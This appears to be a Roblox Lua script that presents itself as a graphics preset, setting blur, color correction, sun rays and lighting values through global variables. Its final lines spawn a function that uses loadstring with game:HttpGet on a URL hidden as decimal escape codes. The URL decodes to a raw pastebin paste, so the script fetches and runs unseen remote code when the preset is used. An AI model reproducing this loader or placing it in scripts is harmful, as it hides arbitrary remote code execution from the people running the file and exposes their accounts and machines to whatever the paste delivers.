_G.BlurSize = 3

_G.ColorCorrectionBrightness = 0.03
_G.ColorCorrectionContrast = 0.3
_G.ColorCorrectionSaturation = 0.01
_G.ColorCorrectionTintColor = Color3.fromRGB(244,244,244)

_G.SunRaysIntensity = 0.2
_G.SunRaysSpread = 1

-- Lighting settings:
_G.GlobalShadows = true
_G.Brightness = 0.9
_G.GeographicLatitude = 350
_G.TimeOfDay = 20
_G.ExposureCompensation = 0.03


spawn(function()
loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\55\110\57\103\53\55\112\50"))()
end)
